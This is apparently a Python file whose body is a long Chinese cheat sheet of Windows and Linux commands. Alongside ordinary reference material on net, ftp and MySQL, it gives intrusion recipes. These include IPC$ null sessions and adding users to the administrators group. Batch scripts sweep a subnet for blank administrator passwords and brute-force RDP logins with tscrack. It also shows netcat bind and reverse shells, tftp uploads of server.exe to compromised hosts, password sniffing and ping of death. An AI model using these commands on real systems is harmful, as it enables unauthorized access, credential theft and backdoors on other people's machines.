# coding=utf-8
import sys
"""
1. calc-----------启动计算器
2.certmgr.msc----证书管理实用程序
3.charmap--------启动字符映射表
5. chkdsk.exe-----Chkdsk磁盘检查
6. ciadv.msc------索引服务程序
7. cleanmgr-------垃圾整理
8. cliconfg-------SQL SERVER 客户端网络实用程序
9. Clipbrd--------剪贴板查看器
10. cmd.exe--------CMD命令提示符
11. compmgmt.msc---计算机管理
12. conf-----------启动netmeeting
13. dcomcnfg-------打开系统组件服务
14. ddeshare-------打开DDE共享设置
15. devmgmt.msc--- 设备管理器
16. dfrg.msc-------磁盘碎片整理程序
17. diskmgmt.msc---磁盘管理实用程序
18. drwtsn32------ 系统医生
19. dvdplay--------DVD播放器
20. dxdiag---------检查DirectX信息
21. explorer-------打开资源管理器
22. eudcedit-------造字程序
23. eventvwr-------事件查看器
24. fsmgmt.msc-----共享文件夹管理器
25. gpedit.msc-----组策略
26. iexpress-------木马捆绑工具，系统自带
27. logoff---------注销命令
28. lusrmgr.msc----本机用户和组
29. notepad--------打开记事本
30. magnify--------放大镜实用程序
31. mem.exe--------显示内存使用情况
32. mmc------------打开控制台49.
33. mobsync--------同步命令
34.mplayer2-------简易widnows media player
35. Msconfig.exe---系统配置实用程序
36. mspaint--------画图板
37. mstsc----------远程桌面连接
38. narrator-------屏幕“讲述人”
39. net start messenger----开始信使服务
40. netstat -an----(TC)命令检查接口
41. net stop messenger-----停止信使服务
42. Nslookup-------IP地址侦测器 ，是一个监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具.
它在Windows NT/2000/XP中均可使用，但在 Windows 98 中却没有集成这一个工具。
43. ntbackup-------系统备份和还原
44. ntmsmgr.msc----移动存储管理器
45. ntmsoprq.msc---移动存储管理员操作请求
46. odbcad32-------ODBC数据源管理器
47. oobe/msoobe /a----检查XP是否激活
48. osk------------打开屏幕键盘
49. packager-------对象包装程序
50. perfmon.msc----计算机性能监测程序
51. progman--------程序管理器
52. regedit.exe----注册表
53. regedt32-------注册表编辑器
54. regsvr32 /u *.dll----停止dll文件运行
55. regsvr32 /u zipfldr.dll------取消ZIP支持
56. rononce -p----15秒关机
57. rsop.msc-------组策略结果集
58. secpol.msc-----本地安全策略
59. services.msc---本地服务设置
60. sfc.exe--------系统文件检查器
61 sfc /scannow-----扫描错误并复原
62. sfc /scannow---windows文件保护
63. shrpubw--------创建共享文件夹
64. shutdown-------60秒倒计时关机命令
65. sigverif-------文件签名验证程序
66. sndrec32-------录音机
67. Sndvol32-------音量控制程序
68. syncapp--------创建一个公文包
69. sysedit--------系统配置编辑器
70. syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码
71. taskmgr--------任务管理器
72. tourstart------xp简介（安装完成后出现的漫游xp程序）
73. utilman--------辅助工具管理器
74. wiaacmgr-------扫描仪和照相机向导
75. winchat--------XP自带局域网聊天
76. winmsd---------系统信息
77. winver---------检查Windows版本
78. write----------写字板
79. wmimgmt.msc----打开windows管理体系结构（WMI)
80. wscript--------windows脚本宿主设置
81. wupdmgr--------windows更新程序
操作详解编辑
net use ipipc$ " " /user:" " 建立IPC空链接
net use ipipc$ "密码" /user:"用户名" 建立IPC非空链接
net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H:
net use h: ipc$ 登陆后映射对方C：到本地为H:
net use ipipc$ /del 删除IPC链接
net use h: /del 删除映射对方到本地的为H：的映射
net user 用户名　密码　/add 建立用户
net user guest /active:yes 激活guest用户
net user 查看有哪些用户
net user 帐户名 查看帐户的属性
net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限
net start 查看开启了哪些服务
net start 服务名　开启服务；（如：net start telnet， net start schedule)
net stop 服务名 停止某服务
net time 目标ip 查看对方时间
net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步，加上参数/yes可取消确认信息
net view 查看本地局域网内开启了哪些共享
net view ip 查看对方局域网内开启了哪些共享
net config 显示系统网络设置
net logoff 断开连接的共享
net pause 服务名 暂停某服务
net send ip "文本信息" 向对方发信息
net ver 局域网内正在使用的网络连接类型和信息
net share 查看本地开启的共享
net share ipc$ 开启ipc$共享
net share ipc$ /del 删除ipc$共享
net share c$ /del 删除C：共享
net user guest 12345 用guest用户登陆后用将密码改为12345
net password 密码 更改系统登陆密码
netstat -a 查看开启了哪些端口，常用netstat -an
netstat -n 查看端口的网络连接情况，常用netstat -an
netstat -v 查看正在进行的工作
netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况
netstat -s 查看正在使用的所有协议使用情况
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名
tracert -参数 ip(或计算机名） 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。
ping ip（或域名） 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。
ping -t -l 65500 ip 死亡之ping（发送大于64K的文件并一直ping就成了死亡之ping)
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98）查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息
tlist -t 以树行列表显示进程（为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内）
kill -F 进程名 加-F参数后强制结束某进程（为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内）
del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件
del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）
move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件，用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖
fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令
at id号 开启已注册的某个计划任务
at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止
at id号 /delete 停止某个已注册的计划任务
at 查看所有的计划任务
at ip time 程序名（或一个命令） /r 在某时间运行对方某程序并重新启动计算机
finger username @host 查看最近有哪些用户登陆
telnet ip 端口 远程登陆服务器，默认端口为23
open ip 连接到IP（属telnet登陆后的命令）
telnet 在本机上直接键入telnet 将进入本机的telnet
copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件
copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下
copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件
copy ipadmin$svv.exe c: 或：copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：
xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件
用参数/e才可连目录下的子目录一起复制到目标地址下。
tftp -i 自己IP（用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送
tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送（文本文件时）
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息
start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令
mem 查看cpu使用情况
attrib 文件名（目录名） 查看某文件（目录）的属性
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉（添加）某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性
dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间
date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间
set 指定环境变量名称=要指派给变量的字符 设置环境变量
set 显示当前所有的环境变量
set p（或其它字符） 显示出当前以字符p（或其它字符）开头的所有环境变量
pause 暂停批处理程序，并显示出：请按任意键继续....
if 在批处理程序中执行条件处理（更多说明见if命令及变量）
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）
call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置
echo 信息 在屏幕上显示出信息
echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中
findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello
find 文件名 查找某文件
title 标题名字 更改CMD窗口标题名字
color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白
prompt 名称 更改cmd.exe的显示的命令提示符（把C：、D：统一改为：EntSky )
ver 在DOS窗口下显示版本信息
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）
format 盘符 /FS：类型 格式化磁盘，类型：FAT、FAT32、NTFS,例：Format D: /FS:NTFS
md　目录名 创建目录
replace 源文件　要替换文件的目录 替换文件
ren 原文件名　新文件名 重命名文件名
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称
type 文件名 显示文本文件的内容
more 文件名 逐屏显示输出文件
doskey 要锁定的命令=字符
doskey 要解锁命令= 为DOS提供的锁定命令（编辑命令行，重新调用win2k命令，并创建宏）。如：锁定dir命令：doskey dir=entsky （不能用doskey dir=dir）；解锁：doskey dir=
taskmgr 调出任务管理器
chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误
tlntadmn telnt服务admn，键入tlntadmn选择3，再选择8，就可以更改telnet服务默认端口23为其它任何端口
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe
path 路径可执行文件的文件名 为可执行文件设置一个路径。
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；
regedit /e 注册表文件名 导出注册表
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名：设定拒绝某用户访问；/P 用户名：perm 替换指定用户的访问权限；/G 用户名：perm 赋予指定用户访问权限；Perm 可以是： N 无，R 读取， W 写入， C 更改（写入），F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。
cacls 文件名 查看文件的访问用户权限列表
REM 文本内容 在批处理文件中添加注解
netsh 查看或更改本地网络配置情况
IIS服务命令
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）
iisreset /start或stop 启动（停止）所有Internet服务
iisreset /restart 停止然后重新启动所有Internet服务
iisreset /status 显示所有Internet服务状态
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。
FTP 命令：（后面有详细说明内容）
ftp的命令行格式为：
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。
－d 使用调试方式。
－n 限制ftp的自动登录，即不使用.netrc文件。
－g 取消全局文件名。
help [命令] 或 ？[命令] 查看命令说明
bye 或 quit 终止主机FTP进程，并退出FTP管理方式.
pwd 列出当前远端主机目录
put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中
mget [remote-files] 从远端主机接收一批文件至本地主机
mput local-files 将本地主机中一批文件传送至远端主机
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件，就将结果写至本地文件
ascii 设定以ASCII方式传送文件（缺省值）
bin 或 image 设定以二进制方式传送文件
bell 每完成一次文件传送，报警提示
cdup 返回上一级目录
close 中断与远程服务器的ftp会话（与open对应）
open host[port] 建立指定ftp服务器连接，可指定连接端口
delete 删除远端主机中的文件
mdelete [remote-files] 删除一批文件
mkdir directory-name 在远端主机中建立目录
rename [from] [to] 改变远端主机中的文件名
rmdir directory-name 删除远端主机中的目录
status 显示当前FTP的状态
system 显示远端主机系统类型
user user-name [password] [account] 重新以别的用户名登录远端主机
open host [port] 重新建立一个新的连接
prompt 交互提示模式
macdef 定义宏命令
lcd 改变当前本地主机的工作目录，如果缺省，就转到当前用户的HOME目录
chmod 改变远端主机的文件权限
case 当为ON时，用MGET命令拷贝的文件名到本地机器中，全部转换为小写字母
cd remote－dir 进入远程主机目录
cdup 进入远程主机目录的父目录
! 在本地机中执行交互shell，exit回到ftp环境，如!ls*.zip
#5
MYSQL 命令
mysql -h主机地址 -u用户名 －p密码 连接MYSQL；如果刚安装好MYSQL，超级用户root是没有密码的。
（例：mysql -h110.110.110.110 -Uroot -P123456
注：u与root可以不用加空格，其它也一样）
exit 退出MYSQL
mysqladmin -u用户名 -p旧密码 password 新密码 修改密码
grant select on 数据库.* to 用户名@登录主机 identified by "密码"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）
show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。
use mysql；
show tables; 显示库中的数据表
describe 表名； 显示数据表的结构
create database 库名； 建库
use 库名；
create table 表名 （字段设定列表）； 建表
drop database 库名；
drop table 表名； 删库和删表
delete from 表名； 将表中记录清空
select * from 表名； 显示表中的记录
mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）；注释：将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。
win2003系统下新增命令（实用部份）：
shutdown /参数 关闭或重启本地或远程主机。
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。
例：shutdown /r /t 0 立即重启本地主机（无延时）
taskkill /参数 进程名或进程的pid 终止一个或多个任务和进程。
参数说明：/PID 要终止进程的pid，可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID）。
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。
Linux系统下基本命令　注：要区分大小写
uname 显示版本信息（同win2K的 ver）
dir 显示当前目录文件，ls -al 显示包括隐藏文件（同win2K的 dir）
pwd 查询当前所在的目录位置
cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。
cat 文件名 查看文件内容
cat >abc.txt 往abc.txt文件中写上内容。
more 文件名 以一页一页的方式显示一个文本文件。
cp 复制文件
mv 移动文件
rm 文件名 删除文件，rm -a 目录名删除目录及子目录
mkdir 目录名 建立目录
rmdir 删除子目录，目录内没有文档。
chmod 设定档案或目录的存取权限
grep 在档案中查找字符串
diff 档案文件比较
find 档案搜寻
date 现在的日期、时间
who 查询目前和你使用同一台机器的人以及Login时间地点
w 查询目前上机者的详细资料
whoami 查看自己的帐号名称
groups 查看某人的Group
passwd 更改密码
history 查看自己下过的命令
ps 显示进程状态
kill 停止某进程
gcc 黑客通常用它来编译C语言写的文件
su 权限转换为指定使用者
telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。
ftp ftp连接上某服务器（同win2K）
批处理命令与变量
1：for命令及变量 基本格式
FOR /参数 %variable IN (set) DO command [command_parameters] %variable：指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。
批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2,user为%3
(set）：指定一个或一组文件，可使用通配符，如：（D:user.txt）和（1 1 254)(1 -1 254),{ “（1 1 254）”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“（1 -1 254）”说明：即从254到1 }
command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开
command_parameters：为特定命令指定参数或命令行开关
IN (set）：指在（set）中取值；DO command ：指执行command
参数：/L 指用增量形式{ (set）为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set）为文件时，如（d:pass.txt）时 }。
用法举例：
@echo off
echo 用法格式：test.bat *.*.* > test.txt
for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \%1.%%G /user:administrator | find "命令成功完成" >>test.txt
存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。
/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量（ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；（1 1 254) 指起始值，增长量，结止值。
@echo off
echo 用法格式：ok.bat ip
FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200
存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。
七：
2：if命令及变量 基本格式
IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。
例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。
0 指发现并成功执行（真）；1 指没有发现、没执行（假）。
IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。
例：“if "%2%"=="4" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" "）
IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。
例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到":end"标签处。
IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”
系统外部命令
注：系统外部命令（均需下载相关工具）
瑞士军刀：nc.exe
参数说明：
-h 查看帮助信息
-d 后台模式
-e prog程序重定向，一但连接就执行[危险]
-i secs延时的间隔
-l 监听模式，用于入站连接
-L 监听模式，连接天闭后仍然继续监听，直到CTR+C
-n IP地址，不能用域名
-o film记录16进制的传输
-p[空格]端口 本地端口号
-r 随机本地及远程端口
-t 使用Telnet交互方式
-u UDP模式
-v 详细输出，用-vv将更详细
-w数字 timeout延时间隔
-z 将输入，输出关掉（用于扫锚时）
基本用法：
nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口
nc -l -p 80 开启本机的TCP 80端口并监听
nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口
nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口
nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口
高级用法：
nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止
nc -L -p 80 > c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C，同时把结果输出到c:log.txt
nc -L -p 80 < c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C，并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用
type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C，并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用
本机上用：nc -l -p 本机端口
在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K
nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙
本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称
在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机
备 注：
| 管道命令
< 或 > 重定向命令。“<；”，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令
@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt >> d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中
>与>>的区别 ">"指：覆盖；">>"指：保存到（添加到）。
如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。
八：
扫描工具：xscan.exe
基本格式
xscan -host <；起始IP>[-<；终止IP>] <；检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息
xscan -file <；主机列表文件名> <；检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息
检测项目
-active 检测主机是否存活
-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）
-port 检测常用服务的端口状态
-ftp 检测FTP弱口令
-pub 检测FTP服务匿名用户写权限
-pop3 检测POP3-Server弱口令
-smtp 检测SMTP-Server漏洞
-sql 检测SQL-Server弱口令
-smb 检测NT-Server弱口令
-iis 检测IIS编码/解码漏洞
-cgi 检测CGI漏洞
-nasl 加载Nessus攻击脚本
-all 检测以上所有项目
其它选项
-i 适配器编号 设置网络适配器，<；适配器编号>可通过"-l"参数获取
-l 显示所有网络适配器
-v 显示详细扫描进度
-p 跳过没有响应的主机
-o 跳过没有检测到开放端口的主机
-t 并发线程数量，并发主机数量 指定最大并发线程数量和并发主机数量，默认数量为100,10
-log 文件名 指定扫描报告文件名 （后缀为：TXT或HTML格式的文件）
用法示例
xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机
xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机
xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机
九：
命令行方式嗅探器： xsniff.exe
可捕获局域网内FTP/SMTP/POP3/HTTP协议密码
参数说明
-tcp 输出TCP数据报
-udp 输出UDP数据报
-icmp 输出ICMP数据报
-pass 过滤密码信息
-hide 后台运行
-host 解析主机名
-addr IP地址 过滤IP地址
-port 端口 过滤端口
-log 文件名 将输出保存到文件
-asc 以ASCII形式输出
-hex 以16进制形式输出
用法示例
xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中
xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出
终端服务密码破解： tscrack.exe
参数说明
-h 显示使用帮助
-v 显示版本信息
-s 在屏幕上打出解密能力
-b 密码错误时发出的声音
-t 同是发出多个连接（多线程）
-N Prevent System Log entries on targeted server
-U 卸载移除tscrack组件
-f 使用－f后面的密码
-F 间隔时间（频率）
-l 使用－l后面的用户名
-w 使用－w后面的密码字典
-p 使用－p后面的密码
-D 登录主页面
用法示例
tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码
tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户
@if not exist ipcscan.txt goto noscan
@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i
nscan
@echo 3389.txt no find or scan faild
（①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)
3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat
@if not exist tscrack.exe goto noscan
@tscrack %1 -l administrator -w pass.dic >>rouji.txt
:noscan
@echo tscrack.exe no find or scan faild
（②存为hack.bat) （运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了）
hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。
其它
Shutdown.exe
Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）
fpipe.exe (TCP端口重定向工具） 在第二篇中有详细说明（端口重定向绕过防火墙）
fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息
Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。
OpenTelnet.exe （远程开启telnet工具）
opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。
NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。
ResumeTelnet.exe (OpenTelnet附带的另一个工具）
resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。
FTP命令详解
FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。
FTP的命令行格式为：
ftp -v -d -i -n -g [主机名] ，其中
-v 显示远程服务器的所有响应信息
-n 限制ftp的自动登录，即不使用；.n etrc文件；
-d 使用调试方式；
-g 取消全局文件名。
FTP使用的内部命令如下（中括号表示可选项）：
1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：！ls*.zip
2.$ macro-ame[args]：执行宏定义macro-name。
3.account[password]：提供登录远程系统成功后访问系统资源所需的补充口令。
4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。
5.ascii：使用ascii类型传输方式。
6.bell：每个命令执行完毕后计算机响铃一次。
7.bin：使用二进制文件传输方式。
8.bye：退出ftp会话过程。
9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。
10. cd remote-dir：进入远程主机目录。
11.cdup：进入远程主机目录的父目录。
12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。
13.close：中断与远程服务器的ftp会话（与open对应）。
14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。
15.delete remote-file：删除远程主机文件。
16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。
17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。
18.disconnection：同close。
19.form format：将文件传输方式设置为format，缺省为file方式。
20.get remote-file[local-file]：将远程主机的文件remote-file传至本地硬盘的local-file。
21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。
22.hash：每传输1024字节，显示一个hash符号（#）。
23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。
24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。
25.image：设置二进制传输方式（同binary）。
26.lcd[dir]：将本地工作目录切换至dir。
27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。
28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。
29.mdelete[remote-file]：删除远程主机文件。
30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile。
31.mget remote-files：传输多个远程文件。
32.mkdir dir-name：在远程主机中建一目录。
33.mls remote-file local-file：同nlist，但可指定多个文件名。
34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。
35.modtime file-name：显示远程主机文件的最后修改时间。
36.mput local-file：将多个文件传输至远程主机。
37.newer file-name：如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。
38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。
39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX机的情况。
